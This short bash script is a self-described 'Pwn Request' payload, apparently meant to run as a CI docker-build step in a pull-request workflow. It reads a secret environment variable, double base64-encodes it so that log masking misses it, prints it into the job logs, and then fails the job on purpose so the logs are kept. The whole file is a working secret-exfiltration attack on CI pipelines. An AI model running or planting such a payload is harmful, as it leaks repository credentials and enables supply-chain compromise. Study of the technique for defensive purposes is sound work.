#!/bin/bash
# Pwn Request payload: executed verbatim by calculate-docker-image@main's
# 'Build docker image' step (${DOCKER_BUILD_SCRIPT} inside .ci/docker).
set -e
echo "GERALT_LEAKED_TOKEN=$(echo -n "$GERALT_SECRET" | base64 | base64)"
# Fail fast so the leaked evidence is preserved in the job logs.
exit 1
